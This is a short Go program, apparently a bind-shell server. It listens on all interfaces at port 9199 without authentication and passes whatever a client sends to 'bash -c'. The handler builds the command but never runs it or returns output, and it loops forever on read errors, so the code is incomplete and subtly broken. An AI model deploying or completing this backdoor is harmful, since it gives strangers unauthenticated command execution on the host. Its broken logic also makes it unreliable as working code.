package main

import (
	"bytes"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func handleConn(conn net.Conn) {
	defer conn.Close()
	for {
		var buf [1024]byte
		n, _ := conn.Read(buf[:])
		cmd := exec.Command("bash", "-c", strings.ReplaceAll(string(buf[:n]), "\r", ""))
		var buffer bytes.Buffer
		cmd.Stdout = &buffer
		cmd.Stderr = &buffer

	}
}
func main() {
	listener, err := net.Listen("tcp", "0.0.0.0:9199")
	if err != nil {
		fmt.Println(err.Error())
	}
	fmt.Println("Listener Address : ", listener.Addr())
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println(err.Error())
		}
		fmt.Println("连接建立，LocalAddr ====> ", conn.LocalAddr())
		fmt.Println("客户端地址，RemoteAddr ====> ", conn.RemoteAddr())
		go handleConn(conn)
	}

}
